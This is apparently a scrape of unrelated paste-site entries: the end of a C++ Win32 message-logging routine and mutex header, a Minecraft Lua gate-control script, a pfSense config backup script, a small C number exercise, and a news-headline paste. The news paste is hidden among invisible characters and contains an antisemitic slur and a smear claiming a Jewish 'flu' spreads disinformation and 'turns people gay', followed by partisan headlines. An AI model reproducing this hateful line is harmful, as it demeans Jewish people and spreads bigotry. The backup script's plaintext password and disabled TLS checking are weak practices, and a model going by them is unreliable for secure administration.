  case WM_POINTERDOWN                   : messageName = ""WM_POINTERDOWN"";       break; //0x0246
#  endif

#  ifdef KIT_PM_WM_POINTERUP
  case WM_POINTERUP                     : messageName = ""WM_POINTERUP"";         break; //0x0247
#  endif

#  ifdef KIT_PM_WM_POINTERENTER
  case WM_POINTERENTER                  : messageName = ""WM_POINTERENTER"";      break; //0x0249
#  endif

#  ifdef KIT_PM_WM_POINTERLEAVE
  case WM_POINTERLEAVE                  : messageName = ""WM_POINTERLEAVE"";      break; //0x024A
#  endif

#  ifdef KIT_PM_WM_POINTERACTIVATE
  case WM_POINTERACTIVATE               : messageName = ""WM_POINTERACTIVATE"";   break; //0x024B
#  endif

#  ifdef KIT_PM_WM_POINTERCAPTURECHANGED
  case WM_POINTERCAPTURECHANGED         : messageName = ""WM_POINTERCAPTURECHANGED""; break; //0x024C
#  endif

#  ifdef KIT_PM_WM_TOUCHHITTESTING
  case WM_TOUCHHITTESTING               : messageName = ""WM_TOUCHHITTESTING"";   break; //0x024D
#  endif

#  ifdef KIT_PM_WM_POINTERWHEEL
  case WM_POINTERWHEEL                  : messageName = ""WM_POINTERWHEEL"";      break; //0x024E
#  endif

#  ifdef KIT_PM_WM_POINTERHWHEEL
  case WM_POINTERHWHEEL                 : messageName = ""WM_POINTERHWHEEL"";     break; //0x024F
#  endif

#  ifdef KIT_PM_DM_POINTERHITTEST
  case DM_POINTERHITTEST                : messageName = ""DM_POINTERHITTEST"";    break; //0x0250
#  endif

#  ifdef KIT_PM_WM_POINTERROUTEDTO
  case WM_POINTERROUTEDTO               : messageName = ""WM_POINTERROUTEDTO"";   break; //0x0251
#  endif

#  ifdef KIT_PM_WM_POINTERROUTEDAWAY
  case WM_POINTERROUTEDAWAY             : messageName = ""WM_POINTERROUTEDAWAY""; break; //0x0252
#  endif

#  ifdef KIT_PM_WM_POINTERROUTEDRELEASED2
  case WM_POINTERROUTEDRELEASED         : messageName = ""WM_POINTERROUTEDRELEASED""; break; //0x0253
#  endif
#endif /* WINVER >= 0x0602 */


#if(WINVER >= 0x0400)
#  ifdef KIT_PM_WM_IME_SETCONTEXT
  case WM_IME_SETCONTEXT                : messageName = ""WM_IME_SETCONTEXT"";    break; //0x0281
#  endif

#  ifdef KIT_PM_WM_IME_NOTIFY
  case WM_IME_NOTIFY                    : messageName = ""WM_IME_NOTIFY"";        break; //0x0282
#  endif

#  ifdef KIT_PM_WM_IME_CONTROL
  case WM_IME_CONTROL                   : messageName = ""WM_IME_CONTROL"";       break; //0x0283
#  endif

#  ifdef KIT_PM_WM_IME_COMPOSITIONFULL
  case WM_IME_COMPOSITIONFULL           : messageName = ""WM_IME_COMPOSITIONFULL""; break; //0x0284
#  endif

#  ifdef KIT_PM_WM_IME_SELECT
  case WM_IME_SELECT                    : messageName = ""WM_IME_SELECT"";        break; //0x0285
#  endif

#  ifdef KIT_PM_WM_IME_CHAR
  case WM_IME_CHAR                      : messageName = ""WM_IME_CHAR"";          break; //0x0286
#  endif
#endif /* WINVER >= 0x0400 */


#if(WINVER >= 0x0500)
#  ifdef KIT_PM_WM_IME_REQUEST
  case WM_IME_REQUEST                   : messageName = ""WM_IME_REQUEST"";       break; //0x0288
#  endif
#endif /* WINVER >= 0x0500 */


#if(WINVER >= 0x0400)
#  ifdef KIT_PM_WM_IME_KEYDOWN
  case WM_IME_KEYDOWN                   : messageName = ""WM_IME_KEYDOWN"";       break; //0x0290
#  endif

#  ifdef KIT_PM_WM_IME_KEYUP
  case WM_IME_KEYUP                     : messageName = ""WM_IME_KEYUP"";         break; //0x0291
#  endif
#endif /* WINVER >= 0x0400 */


#if((_WIN32_WINNT >= 0x0400) || (WINVER >= 0x0500))
#  ifdef KIT_PM_WM_MOUSEHOVER
  case WM_MOUSEHOVER                    : messageName = ""WM_MOUSEHOVER"";        break; //0x02A1
#  endif

#  ifdef KIT_PM_WM_MOUSELEAVE
  case WM_MOUSELEAVE                    : messageName = ""WM_MOUSELEAVE"";        break; //0x02A3
#  endif
#endif


#if(WINVER >= 0x0500)
#  ifdef KIT_PM_WM_NCMOUSEHOVER
  case WM_NCMOUSEHOVER                  : messageName = ""WM_NCMOUSEHOVER"";      break; //0x02A0
#  endif

#  ifdef KIT_PM_WM_NCMOUSELEAVE
  case WM_NCMOUSELEAVE                  : messageName = ""WM_NCMOUSELEAVE"";      break; //0x02A2
#  endif
#endif /* WINVER >= 0x0500 */


#if(_WIN32_WINNT >= 0x0501)
#  ifdef KIT_PM_WM_WTSSESSION_CHANGE
  case WM_WTSSESSION_CHANGE             : messageName = ""WM_WTSSESSION_CHANGE""; break; //0x02B1
#  endif
#endif /* _WIN32_WINNT >= 0x0501 */


#if(WINVER >= 0x0601)
#  ifdef KIT_PM_WM_DPICHANGED
  case WM_DPICHANGED                    : messageName = ""WM_DPICHANGED"";        break; //0x02E0
#  endif
#endif /* WINVER >= 0x0601 */


#if(WINVER >= 0x0605)
#  ifdef KIT_PM_WM_DPICHANGED_BEFOREPARENT
  case WM_DPICHANGED_BEFOREPARENT       : messageName = ""WM_DPICHANGED_BEFOREPARENT""; break; //0x02E2
#  endif

#  ifdef KIT_PM_WM_DPICHANGED_AFTERPARENT
  case WM_DPICHANGED_AFTERPARENT        : messageName = ""WM_DPICHANGED_AFTERPARENT"";  break; //0x02E3
#  endif

#  ifdef KIT_PM_WM_GETDPISCALEDSIZE
  case WM_GETDPISCALEDSIZE              : messageName = ""WM_GETDPISCALEDSIZE"";  break; //0x02E4
#  endif
#endif /* WINVER >= 0x0605 */


#  ifdef KIT_PM_WM_CUT
  case WM_CUT                           : messageName = ""WM_CUT"";               break; //0x0300
#  endif

#  ifdef KIT_PM_WM_COPY
  case WM_COPY                          : messageName = ""WM_COPY"";              break; //0x0301
#  endif

#  ifdef KIT_PM_WM_PASTE
  case WM_PASTE                         : messageName = ""WM_PASTE"";             break; //0x0302
#  endif

#  ifdef KIT_PM_WM_CLEAR
  case WM_CLEAR                         : messageName = ""WM_CLEAR"";             break; //0x0303
#  endif

#  ifdef KIT_PM_WM_UNDO
  case WM_UNDO                          : messageName = ""WM_UNDO"";              break; //0x0304
#  endif

#  ifdef KIT_PM_WM_RENDERFORMAT
  case WM_RENDERFORMAT                  : messageName = ""WM_RENDERFORMAT"";      break; //0x0305
#  endif

#  ifdef KIT_PM_WM_RENDERALLFORMATS
  case WM_RENDERALLFORMATS              : messageName = ""WM_RENDERALLFORMATS"";  break; //0x0306
#  endif

#  ifdef KIT_PM_WM_DESTROYCLIPBOARD
  case WM_DESTROYCLIPBOARD              : messageName = ""WM_DESTROYCLIPBOARD"";  break; //0x0307
#  endif

#  ifdef KIT_PM_WM_DRAWCLIPBOARD
  case WM_DRAWCLIPBOARD                 : messageName = ""WM_DRAWCLIPBOARD"";     break; //0x0308
#  endif

#  ifdef KIT_PM_WM_PAINTCLIPBOARD
  case WM_PAINTCLIPBOARD                : messageName = ""WM_PAINTCLIPBOARD"";    break; //0x0309
#  endif

#  ifdef KIT_PM_WM_VSCROLLCLIPBOARD
  case WM_VSCROLLCLIPBOARD              : messageName = ""WM_VSCROLLCLIPBOARD"";  break; //0x030A
#  endif

#  ifdef KIT_PM_WM_SIZECLIPBOARD
  case WM_SIZECLIPBOARD                 : messageName = ""WM_SIZECLIPBOARD"";     break; //0x030B
#  endif

#  ifdef KIT_PM_WM_ASKCBFORMATNAME
  case WM_ASKCBFORMATNAME               : messageName = ""WM_ASKCBFORMATNAME"";   break; //0x030C
#  endif

#  ifdef KIT_PM_WM_CHANGECBCHAIN
  case WM_CHANGECBCHAIN                 : messageName = ""WM_CHANGECBCHAIN"";     break; //0x030D
#  endif

#  ifdef KIT_PM_WM_HSCROLLCLIPBOARD
  case WM_HSCROLLCLIPBOARD              : messageName = ""WM_HSCROLLCLIPBOARD"";  break; //0x030E
#  endif

#  ifdef KIT_PM_WM_QUERYNEWPALETTE
  case WM_QUERYNEWPALETTE               : messageName = ""WM_QUERYNEWPALETTE"";   break; //0x030F
#  endif

#  ifdef KIT_PM_WM_PALETTEISCHANGING
  case WM_PALETTEISCHANGING             : messageName = ""WM_PALETTEISCHANGING""; break; //0x0310
#  endif

#  ifdef KIT_PM_WM_PALETTECHANGED
  case WM_PALETTECHANGED                : messageName = ""WM_PALETTECHANGED"";    break; //0x0311
#  endif

#  ifdef KIT_PM_WM_HOTKEY
  case WM_HOTKEY                        : messageName = ""WM_HOTKEY"";            break; //0x0312
#  endif


#if(WINVER >= 0x0400)
#  ifdef KIT_PM_WM_PRINT
  case WM_PRINT                         : messageName = ""WM_PRINT"";       break; //0x0317
#  endif

#  ifdef KIT_PM_WM_PRINTCLIENT
  case WM_PRINTCLIENT                   : messageName = ""WM_PRINTCLIENT""; break; //0x0318
#  endif
#endif /* WINVER >= 0x0400 */


#if(_WIN32_WINNT >= 0x0500)
#  ifdef KIT_PM_WM_APPCOMMAND
  case WM_APPCOMMAND                    : messageName = ""WM_APPCOMMAND""; break; //0x0319
#  endif
#endif /* _WIN32_WINNT >= 0x0500 */


#if(_WIN32_WINNT >= 0x0501)
#  ifdef KIT_PM_WM_THEMECHANGED
  case WM_THEMECHANGED                  : messageName = ""WM_THEMECHANGED""; break; //0x031A
#  endif
#endif /* _WIN32_WINNT >= 0x0501 */


#if(_WIN32_WINNT >= 0x0501)
#  ifdef KIT_PM_WM_CLIPBOARDUPDATE
  case WM_CLIPBOARDUPDATE               : messageName = ""WM_CLIPBOARDUPDATE""; break; //0x031D
#  endif
#endif /* _WIN32_WINNT >= 0x0501 */


#if(_WIN32_WINNT >= 0x0600)
#  ifdef KIT_PM_WM_DWMCOMPOSITIONCHANGED
  case WM_DWMCOMPOSITIONCHANGED         : messageName = ""WM_DWMCOMPOSITIONCHANGED"";       break; //0x031E
#  endif

#  ifdef KIT_PM_WM_DWMNCRENDERINGCHANGED
  case WM_DWMNCRENDERINGCHANGED         : messageName = ""WM_DWMNCRENDERINGCHANGED"";       break; //0x031F
#  endif

#  ifdef KIT_PM_WM_DWMCOLORIZATIONCOLORCHANGED
  case WM_DWMCOLORIZATIONCOLORCHANGED   : messageName = ""WM_DWMCOLORIZATIONCOLORCHANGED""; break; //0x0320
#  endif

#  ifdef KIT_PM_WM_DWMWINDOWMAXIMIZEDCHANGE
  case WM_DWMWINDOWMAXIMIZEDCHANGE      : messageName = ""WM_DWMWINDOWMAXIMIZEDCHANGE"";    break; //0x0321
#  endif
#endif /* _WIN32_WINNT >= 0x0600 */


#if(_WIN32_WINNT >= 0x0601)
#  ifdef KIT_PM_WM_DWMSENDICONICTHUMBNAIL
  case WM_DWMSENDICONICTHUMBNAIL        : messageName = ""WM_DWMSENDICONICTHUMBNAIL"";         break; //0x0323
#  endif

#  ifdef KIT_PM_WM_DWMSENDICONICLIVEPREVIEWBITMAP
  case WM_DWMSENDICONICLIVEPREVIEWBITMAP: messageName = ""WM_DWMSENDICONICLIVEPREVIEWBITMAP""; break; //0x0326
#  endif
#endif /* _WIN32_WINNT >= 0x0601 */


#if(WINVER >= 0x0600)
#  ifdef KIT_PM_WM_GETTITLEBARINFOEX
  case WM_GETTITLEBARINFOEX             : messageName = ""WM_GETTITLEBARINFOEX""; break; //0x033F
#  endif
#endif /* WINVER >= 0x0600 */


  default:;
#  ifdef KIT_PM_WM_UNKNOWN
  messageName = ""(unknown)"";
#  endif
  }



  if(messageName != nullptr){
    printf(""hwnd=%p, wParam=0x%08X, lParam=%p, msg={ 0x%08X \""%s\"" }\n"",
           hwnd, (u32)wParam, (void*)lParam, message, messageName);
  }
}
#endif /* _DEBUG */

/*-src\kit_win32\kit_Window_WindowProc.cpp-*/


/*+include\kit\_misc_Mutex.hpp+*/

#ifndef _KIT_INC__MISC_MUTEX_HPP
#define _KIT_INC__MISC_MUTEX_HPP

#include ""commondef.hpp""


namespace kit {




//this mutex is non-blocking within the same thread!
 //(that means you can lock multiple times in one thread
 // as long as you unlock it the same number of times)
class MutexSimple {
  u32 _type;
  u32 _spinCount;
  _GenericOpaquePtr _mutex_ptr = nullptr;

public:
  MutexSimple(u32 spinCount = -1);
  ~MutexSimple();

  void setSpinCount(u32 spinCount);
  u32 getSpinCount(){ return _spinCount; }

  void lock(bool locked = true);
  void unlock(){ lock(false); }
  bool tryLock(); //returns true if locked successfully

};




};


#endif /* _KIT_INC__MISC_MUTEX_HPP */

/*-include\kit\_misc_Mutex.hpp-*/"
WPUqMgQB,Bastion Reciever Secondary,Alexr360,Lua,Thursday 22nd of February 2024 11:53:31 PM CDT,"local function bastion()
	local modem = peripheral.find(""modem"") or error(""No modem attached"", 0)
    modem.open(15) -- Open 43 so we can receive replies

    -- And wait for a reply
    local event, side, channel, replyChannel, message, distance
    repeat
      event, side, channel, replyChannel, message, distance = os.pullEvent(""modem_message"")
    until channel == 15

    -- Process the received message based on its content
    if message == ""Bridge"" then
        os.sleep(1)
        if redstone.getInput(""left"") then
	        modem.transmit(43, 15, ""Closing Bridge Gate"")
        else
	        modem.transmit(43, 15, ""Opening Bridge Gate"")
        end

    elseif message == ""Courtyard"" then
        os.sleep(1)
        if redstone.getInput(""right"") then
	        modem.transmit(43, 15, ""Closing Courtyard Gate"")
        else
	        modem.transmit(43, 15, ""Opening Courtyard Gate"")
        end

    elseif message == ""status"" then
		courtyard = """"
		bridge = """"
		lockdown = """"
        if redstone.getInput(""right"") then
			courtyard = ""Courtyard Gate Closed, ""
        else
	        courtyard = ""Courtyard Gate Open, ""
        end
        if redstone.getInput(""left"") then
	        bridge = ""Bridge Gate Closed, ""
        else
	        bridge = ""Bridge Gate Open, ""
        end
        if redstone.getInput(""back"") then
	        lockdown = ""Lockdown Enabled""
        else
	        lockdown = ""Lockdown Disabled""
        end
	    modem.transmit(43, 15, courtyard .. bridge .. lockdown)


    elseif message == ""Lockdown"" then
        os.sleep(1)
        if redstone.getInput(""back"") then
	        modem.transmit(43, 15, ""Enabeling Lockdown"")
        else
	        modem.transmit(43, 15, ""Disabeling Lockdown"")
        end
    end
end

term.clear()
term.setCursorPos(1, 1)
print(""Bastion Online!"")

-- Main loop
while true do
    bastion()
end
"
9gn8yzwF,pfSense backup script,macdaddybighorn,Bash,Thursday 22nd of February 2024 11:36:25 PM CDT,"#!/bin/bash

#MacDaddyBighorn's pfSense backup script
#This will back up your pfsense config and email you if the backup location isn't ready.
#There are probably some good improvements to be made, but works for me.

#Mount path for backup location, to verify mounted and ready (since I encrypt mine I don't want it to try)
MOUNT_PATH=""/mnt/backup/""

#Path to backup config file
BACKUP_PATH=""/mnt/backup/pfbackup/""

#pfSense Info
PFSENSE_IP=""https://IP_ADDRESS:PORT/""
PFSENSE_USER=""ADMIN""
PFSENSE_PASS=""PASSWORD""

#File name to append in front of date
FILE_NAME=""pfSense_""

# email address details (must be set up email capability on server first)
EMAIL_FROM='pfSense Backup <EMAIL_FROM@EMAIL.COM>'
EMAIL_TO='EMAIL_TO@EMAIL.COM'

#Verfy mountpoint is valid (unencrypted, mounted, etc.)
if mountpoint -q ""$MOUNT_PATH""
   then
      curl -L -k --cookie-jar ""$BACKUP_PATH""cookies.txt \
           ""$PFSENSE_IP"" \
           | grep ""name='__csrf_magic'"" \
           | sed 's/.*value=""\(.*\)"".*/\1/' > ""$BACKUP_PATH""csrf.txt

      curl -L -k --cookie ""$BACKUP_PATH""cookies.txt --cookie-jar ""$BACKUP_PATH""cookies.txt \
           --data-urlencode ""login=Login"" \
           --data-urlencode ""usernamefld=$PFSENSE_USER"" \
           --data-urlencode ""passwordfld=$PFSENSE_PASS"" \
           --data-urlencode ""__csrf_magic=$(cat ""$BACKUP_PATH""csrf.txt)"" \
           ""$PFSENSE_IP"" > /dev/null

      curl -L -k --cookie ""$BACKUP_PATH""cookies.txt --cookie-jar ""$BACKUP_PATH""cookies.txt \
           ""$PFSENSE_IP""diag_backup.php  \
           | grep ""name='__csrf_magic'""   \
           | sed 's/.*value=""\(.*\)"".*/\1/' > ""$BACKUP_PATH""csrf.txt

      curl -L -k --cookie ""$BACKUP_PATH""cookies.txt --cookie-jar ""$BACKUP_PATH""cookies.txt \
           --data-urlencode ""download=download"" \
           --data-urlencode ""donotbackuprrd=yes"" \
           --data-urlencode ""__csrf_magic=$(head -n 1 ""$BACKUP_PATH""csrf.txt)"" \
           ""$PFSENSE_IP""diag_backup.php > ""$BACKUP_PATH$FILE_NAME""`date +%Y""-""%m""-""%d`.xml

      rm ""$BACKUP_PATH""cookies.txt
      rm ""$BACKUP_PATH""csrf.txt 

	  #Commented out, no need to notify if successful
      #echo ""pfSense Primary Backup Complete"" | mail -s ""pfSense Backup Complete"" -r ""$EMAIL_FROM"" ""$EMAIL_TO""
  else
    echo ""pfSense Primary Backup Failed"" | mail -s ""pfSense Backup Failed"" -r ""$EMAIL_FROM"" ""$EMAIL_TO""
fi"
8kVgFvZd,1116水仙花数,deezykiki,C,Thursday 22nd of February 2024 11:26:21 PM CDT,"#include<stdio.h>
#include<string.h>
#include<math.h>


int main()
{
	char a[10];
	while(1)
	{
		scanf(""%s"",&a);
		if(a[0] == '0') return 0;
		int len = strlen(a);
		int sum = 0,num = 0;
		for(int i = len-1;i >= 0;i--)
		{
			sum = sum+pow((a[i]-'0'),len);
			num = num+(a[i]-'0')*pow(10,len-i-1);
		}
		if(sum == num) printf(""Yes\n"");
		else printf(""No\n"");
	}
		
}"
kw42V7uh,Mad,Unknown_No_1,PHP,Thursday 22nd of February 2024 10:32:33 PM CDT,MadHameshaBrandRahega
gA9CM6Vp,News Feb22 24,Newscaster_Ned,Email,Thursday 22nd of February 2024 07:55:18 PM CDT,".‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎1‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎
.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎2‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎
.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎3‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎
.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎.‎‎‎ ‎‎‎T‎‎‎e‎‎‎s‎‎‎t‎‎‎ ‎‎‎c‎‎‎o‎‎‎m‎‎‎p‎‎‎l‎‎‎e‎‎‎t‎‎‎e‎‎‎.‎‎‎

*‎C‎o‎u‎g‎h‎*‎ ‎C‎r‎a‎p‎ ‎I‎ ‎h‎a‎v‎e‎ ‎t‎h‎e‎ ‎f‎l‎e‎w‎.‎ ‎O‎f‎ ‎w‎h‎i‎c‎h‎ ‎I‎ ‎w‎i‎l‎l‎ ‎g‎i‎v‎e‎ ‎t‎o‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎e‎l‎s‎e‎.‎ ‎I‎t‎'‎s‎ ‎t‎h‎e‎ ‎k‎i‎k‎e‎ ‎f‎l‎e‎w‎.‎ ‎I‎t‎ ‎s‎p‎r‎e‎a‎d‎s‎ ‎d‎i‎s‎i‎n‎f‎o‎r‎m‎a‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎t‎u‎r‎n‎s‎ ‎p‎e‎o‎p‎l‎e‎ ‎g‎a‎y‎.‎.‎.‎ ‎

C‎l‎y‎b‎u‎r‎n‎:‎ ‎B‎i‎d‎e‎n‎ ‎'‎F‎o‎r‎g‎a‎v‎e‎'‎ ‎S‎t‎u‎d‎e‎n‎t‎ ‎L‎o‎a‎n‎s‎ ‎P‎e‎o‎p‎l‎e‎ ‎H‎a‎d‎ ‎P‎a‎i‎d‎,‎ ‎I‎t‎'‎s‎ ‎N‎o‎t‎ ‎a‎ ‎G‎i‎v‎e‎a‎w‎a‎y‎
W‎e‎n‎d‎y‎ ‎W‎i‎l‎l‎i‎a‎m‎s‎ ‎h‎a‎s‎ ‎f‎r‎o‎n‎t‎o‎t‎e‎m‎p‎o‎r‎a‎l‎ ‎d‎e‎m‎e‎n‎t‎i‎a‎.‎ ‎W‎h‎a‎t‎ ‎i‎s‎ ‎F‎T‎D‎?‎
N‎Y‎C‎ ‎C‎o‎u‎n‎c‎i‎l‎:‎ ‎I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎e‎ ‎M‎a‎y‎o‎r‎'‎s‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎H‎a‎n‎d‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎$‎1‎0‎K‎ ‎P‎r‎e‎-‎P‎a‎i‎d‎ ‎C‎a‎r‎d‎s‎
F‎r‎a‎n‎ ‎L‎e‎b‎o‎w‎i‎t‎z‎:‎ ‎B‎i‎d‎e‎n‎ ‎I‎s‎ ‎'‎T‎o‎o‎ ‎O‎l‎d‎'‎ ‎t‎o‎ ‎R‎u‎n‎ ‎A‎g‎a‎i‎n‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎O‎v‎e‎r‎s‎e‎e‎s‎ ‎7‎.‎2‎M‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎s‎ ‎a‎t‎ ‎S‎o‎u‎t‎h‎e‎r‎n‎ ‎B‎o‎r‎d‎e‎r‎

E‎q‎u‎i‎v‎a‎l‎e‎n‎t‎ ‎t‎o‎ ‎2‎ ‎Y‎e‎a‎r‎s‎ ‎o‎f‎ ‎U‎.‎S‎.‎ ‎B‎i‎r‎t‎h‎s‎

M‎a‎y‎o‎r‎k‎a‎s‎ ‎S‎t‎o‎n‎e‎w‎a‎l‎l‎i‎n‎g‎ ‎C‎o‎n‎g‎r‎e‎s‎s‎ ‎o‎n‎ ‎H‎o‎w‎ ‎M‎a‎n‎y‎ ‎R‎e‎l‎e‎a‎s‎e‎d‎ ‎i‎n‎t‎o‎ ‎U‎S‎A‎
A‎s‎y‎l‎u‎m‎ ‎s‎e‎e‎k‎e‎r‎s‎ ‎w‎a‎i‎t‎ ‎i‎n‎ ‎l‎i‎n‎e‎ ‎t‎o‎ ‎b‎e‎ ‎p‎r‎o‎c‎e‎s‎s‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎B‎o‎r‎d‎e‎r‎ ‎P‎a‎t‎r‎o‎l‎ ‎a‎t‎ ‎a‎ ‎m‎a‎k‎e‎s‎h‎i‎f‎t‎ ‎c‎a‎m‎p‎ ‎n‎e‎a‎r‎
P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎J‎o‎e‎ ‎B‎i‎d‎e‎n‎ ‎h‎a‎s‎ ‎o‎v‎e‎r‎s‎e‎e‎n‎ ‎a‎ ‎r‎e‎c‎o‎r‎d‎-‎b‎r‎e‎a‎k‎i‎n‎g‎ ‎l‎e‎v‎e‎l‎ ‎o‎f‎ ‎i‎l‎l‎e‎g‎a‎l‎ ‎i‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎a‎t‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎-‎M‎e‎x‎i‎c‎o‎ ‎b‎o‎r‎d‎e‎r‎ ‎—‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎p‎o‎r‎t‎i‎o‎n‎ ‎o‎f‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎b‎e‎i‎n‎g‎ ‎r‎e‎l‎e‎a‎s‎e‎d‎ ‎d‎i‎r‎e‎c‎t‎l‎y‎ ‎i‎n‎t‎o‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎t‎o‎w‎n‎s‎ ‎a‎n‎d‎ ‎c‎i‎t‎i‎e‎s‎.‎

‘‎W‎h‎a‎t‎ ‎H‎a‎v‎e‎ ‎T‎h‎e‎y‎ ‎D‎o‎n‎e‎?‎’‎:‎ ‎D‎a‎v‎e‎ ‎P‎o‎r‎t‎n‎o‎y‎ ‎C‎a‎l‎l‎s‎ ‎N‎o‎t‎r‎e‎ ‎D‎a‎m‎e‎ ‎F‎o‎o‎t‎b‎a‎l‎l‎ ‎a‎ ‎‘‎R‎e‎l‎i‎c‎ ‎o‎f‎ ‎t‎h‎e‎ ‎P‎a‎
'‎W‎h‎a‎t‎ ‎H‎a‎v‎e‎ ‎T‎h‎e‎y‎ ‎D‎o‎n‎e‎?‎'‎:‎ ‎N‎o‎t‎r‎e‎ ‎D‎a‎m‎e‎ ‎F‎l‎a‎m‎e‎d‎ ‎a‎s‎ ‎'‎R‎e‎l‎i‎c‎ ‎o‎f‎ ‎t‎h‎e‎ ‎P‎a‎s‎t‎'‎
1‎3‎2‎
R‎A‎N‎D‎Y‎ ‎C‎L‎A‎R‎K‎:‎ ‎B‎i‎d‎e‎n‎’‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎B‎o‎r‎d‎e‎r‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎M‎e‎x‎i‎c‎o‎ ‎C‎o‎u‎l‎d‎ ‎L‎e‎a‎v‎e‎ ‎B‎o‎r‎d‎e‎r‎ ‎O‎p‎e‎n‎ ‎f‎o‎r‎ ‎Y‎e‎a‎r‎s‎
B‎i‎d‎e‎n‎'‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎B‎o‎r‎d‎e‎r‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎M‎e‎x‎i‎c‎o‎ ‎C‎o‎u‎l‎d‎ ‎L‎e‎a‎v‎e‎ ‎B‎o‎r‎d‎e‎r‎ ‎O‎p‎e‎n‎ ‎f‎o‎r‎ ‎Y‎e‎a‎r‎s‎
4‎0‎1‎
A‎f‎t‎e‎r‎ ‎h‎a‎l‎f‎-‎c‎e‎n‎t‎u‎r‎y‎ ‎a‎b‎s‎e‎n‎c‎e‎,‎ ‎U‎.‎S‎.‎ ‎r‎e‎t‎u‎r‎n‎s‎ ‎t‎o‎ ‎m‎o‎o‎n‎ ‎a‎s‎ ‎l‎u‎n‎a‎r‎ ‎l‎a‎n‎d‎e‎r‎ ‎O‎d‎y‎s‎s‎e‎u‎s‎ ‎t‎o‎u‎c‎h‎e‎s‎ ‎d‎o‎w‎n‎
A‎f‎t‎e‎r‎ ‎h‎a‎l‎f‎-‎c‎e‎n‎t‎u‎r‎y‎ ‎a‎b‎s‎e‎n‎c‎e‎,‎ ‎U‎.‎S‎.‎ ‎r‎e‎t‎u‎r‎n‎s‎ ‎t‎o‎ ‎m‎o‎o‎n‎ ‎a‎s‎ ‎l‎u‎n‎a‎r‎ ‎l‎a‎n‎d‎e‎r‎ ‎O‎d‎y‎s‎s‎e‎u‎s‎ ‎t‎o‎u‎c‎h‎e‎s‎ ‎d‎o‎w‎n‎
1‎6‎0‎
P‎a‎u‎l‎ ‎R‎y‎a‎n‎ ‎B‎a‎s‎h‎e‎s‎ ‎T‎r‎u‎m‎p‎ ‎a‎n‎d‎ ‎‘‎T‎r‎u‎m‎p‎ ‎P‎o‎p‎u‎l‎i‎s‎m‎,‎’‎ ‎S‎a‎y‎s‎ ‎I‎t‎’‎s‎ ‎N‎o‎w‎ ‎t‎h‎e‎ ‎‘‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎
P‎a‎u‎l‎ ‎R‎y‎a‎n‎ ‎B‎a‎s‎h‎e‎s‎ ‎'‎T‎r‎u‎m‎p‎ ‎P‎o‎p‎u‎l‎i‎s‎m‎'‎ ‎-‎-‎ ‎S‎a‎y‎s‎ ‎I‎t‎'‎s‎ ‎N‎o‎w‎ ‎t‎h‎e‎ ‎'‎E‎s‎t‎a‎b‎l‎i‎s‎h‎m‎e‎n‎t‎'‎
3‎,‎8‎9‎5‎
